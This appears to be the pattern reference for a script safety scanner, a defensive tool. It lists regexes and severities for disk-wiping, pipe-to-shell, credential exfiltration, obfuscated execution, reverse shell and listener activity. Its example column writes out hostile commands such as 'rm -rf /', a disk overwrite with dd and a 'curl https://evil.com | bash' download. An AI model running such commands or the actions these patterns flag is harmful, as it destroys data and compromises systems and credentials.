# Script Safety Patterns

Canonical reference for the script safety scanner. Scans `.sh`, `.bash`, `.py`, `.js`, `.ts` files.

---

## CRITICAL — Destructive Operations

| Pattern (regex) | Risk | Example |
|:----------------|:-----|:--------|
| `rm\s+-rf\s+[/~]` | Wipes root or home directory | `rm -rf /` |
| `rm\s+-rf\s+\$HOME` | Wipes home via variable | `rm -rf $HOME` |
| `dd\s+if=.*of=/dev/` | Disk overwrite | `dd if=/dev/zero of=/dev/sda` |
| `mkfs\s+.*\s+/dev/` | Disk reformat | `mkfs.ext4 /dev/sda1` |

## CRITICAL — Remote Code Execution (Pipe-to-Shell)

| Pattern (regex) | Risk | Example |
|:----------------|:-----|:--------|
| `(curl\|wget)\s+.+\|\s*(ba)?sh` | Download and execute | `curl https://evil.com \| bash` |
| `(curl\|wget)\s+.+\|\s*python` | Download and run Python | `curl url \| python` |
| `(curl\|wget)\s+.+\|\s*node` | Download and run Node | `wget url \| node` |
| `(curl\|wget)\s+.+\|\s*(perl\|ruby)` | Download and run script | `curl url \| perl` |

## CRITICAL — Credential Exfiltration

| Pattern (regex) | Risk |
|:----------------|:-----|
| `curl\s+.*-X\s+POST.*\.(ssh\|aws\|gnupg\|env)` | POST with credential path |
| `base64\s+.*\.(ssh\|gnupg\|aws).*\|\s*curl` | Encode credentials then send |

## CRITICAL — Obfuscated Execution

| Pattern (regex) | Risk |
|:----------------|:-----|
| `eval\s*\(.*base64\|eval\s+\$\(.*base64` | Decoded payload execution |
| `exec\s*\(.*base64` | Same via exec |
| `\$\(.*base64\s+-d.*\)` | Inline decode-and-run |
| `python.*exec\s*\(.*__import__` | Dynamic import execution |

## CRITICAL — Reverse Shell

| Pattern (regex) | Risk |
|:----------------|:-----|
| `bash\s+-i\s+>&\s*/dev/tcp` | Bash reverse shell |
| `python.*socket.*connect.*exec` | Python reverse shell |
| `nc\s+.*-e\s+/bin/(ba)?sh` | Netcat reverse shell |

## WARN — Privilege Escalation

| Pattern | Risk | Notes |
|:--------|:-----|:------|
| `\bsudo\b` | Root execution | May be legitimate |
| `chmod\s+(a\+w\|777)` | World-writable | Security misconfig |
| `chmod\s+[ug]\+s` | setuid/setgid | Privilege persistence |

## WARN — Network Listeners

| Pattern | Risk |
|:--------|:-----|
| `nc\s+-l\b\|ncat\s+-l\b` | Possible backdoor |
| `python.*http\.server` | Exposes local files |
| `socat\s+.*LISTEN` | Advanced listener |

## WARN — Credential Path Access

| Pattern | Target |
|:--------|:-------|
| `~/\.ssh/\|\$HOME/\.ssh/` | SSH keys |
| `~/\.aws/\|\$HOME/\.aws/` | AWS credentials |
| `~/\.gnupg/\|\$HOME/\.gnupg/` | GPG keys |
| `~/\.config/(gh\|gcloud\|azure)` | Cloud CLI credentials |
| `~/Library/Keychains` | macOS Keychain |
| `\.env\b` | API keys / secrets |

## WARN — Outbound Data

| Pattern | Notes |
|:--------|:------|
| `curl\s+.*-X\s+POST` | Review destination URL |
| `requests\.post\(` | Review endpoint |
| `axios\.post\(\|fetch.*method.*POST` | Review endpoint |

---

## Contributing

Add patterns with: regex, severity, risk description, and at least one example.
